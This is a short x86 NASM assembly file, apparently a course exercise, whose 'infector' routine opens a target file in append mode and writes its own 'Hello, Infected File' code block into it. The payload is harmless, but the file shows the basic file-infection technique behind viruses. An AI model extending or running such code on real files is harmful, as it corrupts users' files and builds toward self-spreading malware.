;DEFINITIONS
SYS_WRITE       equ 4
SYS_OPEN        equ 5
SYS_CLOSE       equ 6
SYS_EXIT        equ 1
O_APPEND        equ 1024
O_RDWR          equ 2
S_IRWXU         equ 00700
STDOUT          equ 1


section .data:
    msg db "Hello, Infected File", 10, 0
    len_msg equ $ - msg
    msg_open db "can't open file", 10, 0
    len_open equ $ - msg_open
    msg_close db "can't close file", 10, 0
    len_close equ $ - msg_close
    msg_write db "can't write", 10, 0
    len_write equ $ - msg_write
    


section .text
global _start
global system_call
global infector
extern strlen
extern main


system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; eax = argc
    shl     eax,2       ; eax *= 4
    add     eax,esi     ; eax = &argv + 4 * argc
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

code_start:

infection:
    mov eax, SYS_WRITE
    mov ebx, STDOUT
    mov ecx, msg
    mov edx, len_msg
    int 0x80
    ret

code_end:

infector:
    push ebp
    mov ebp, esp
    sub esp, 4
    pushad

    mov eax, SYS_OPEN       ;; open
    mov ebx, [ebp+8]
    mov ecx, O_APPEND
    or ecx, O_RDWR
    mov edx, S_IRWXU
    int 0x80
    push eax

    cmp eax, 0
    jl error_open

    mov ebx, [esp]        ;; write
    mov eax, SYS_WRITE
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start
    int 0x80

    cmp eax, 0
    jl error_write

    mov eax, SYS_CLOSE      ;; close
    pop ebx
    int 0x80

    cmp eax, 0
    jl error_close

    popad
    add esp, 4
    pop ebp
    ret

error_open:
    mov eax, SYS_WRITE
    mov ebx, STDOUT
    mov ecx, msg_open
    mov edx, len_open
    int 0x80
    jmp exit_error

error_write:
    mov eax, SYS_WRITE
    mov ebx, STDOUT
    mov ecx, msg_write
    mov edx, len_write
    int 0x80
    jmp exit_error
    
error_close:
    mov eax, SYS_WRITE
    mov ebx, STDOUT
    mov ecx, msg_close
    mov edx, len_close
    int 0x80
    jmp exit_error

exit_error:
    mov eax, SYS_EXIT
    mov ebx, 1
    int 0x80
    
